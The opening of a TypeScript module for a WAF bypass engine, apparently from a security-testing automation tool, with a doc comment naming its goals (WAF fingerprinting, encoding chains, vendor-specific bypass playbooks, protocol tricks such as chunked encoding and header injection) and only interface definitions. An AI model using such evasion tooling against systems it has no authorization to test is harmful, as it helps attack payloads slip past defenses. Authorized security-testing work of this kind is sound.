/**
 * waf_bypass_engine — Dedicated WAF detection, fingerprinting, and bypass module.
 *
 * Extracted from the automation engine's phase 4g to provide:
 *   1. Standalone WAF fingerprinting with a richer signature database
 *   2. Multi-layer encoding chains (not just single transforms)
 *   3. Per-WAF bypass playbooks tuned to vendor-specific weaknesses
 *   4. Protocol-level bypass techniques (HTTP/2, chunked TE, header injection)
 *   5. API endpoint for on-demand WAF analysis outside of full hunts
 */

import axios from 'axios';

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

export interface WafSignature {
  name: string;
  vendor: string;
  headers: Record<string, RegExp>;
  bodyPatterns: RegExp[];
  statusCodes: number[];
  /** Cookie patterns that betray the WAF vendor */
  cookiePatterns?: RegExp[];
}

export interface WafDetection {
  name: string;
  vendor: string;
  confidence: number;
  endpoint: string;
  evidence: string[];
}

export interface BypassTechnique {
  name: string;
  category: 'encoding' | 'protocol' | 'structural' | 'semantic';
  /** Human description of why this works */
  rationale: string;
  transform: (payload: string) => string;
  /** WAF vendors this technique is most effective against */
  effectiveAgainst?: string[];
}

export interface BypassResult {
  technique: string;
  category: string;
  payloadType: string;
  originalPayload: string;
  encodedPayload: string;
  originalStatus: number;
  bypassStatus: number;
  cleanStatus: number;
  endpoint: string;
  wafName: string;
  confidence: number;
}

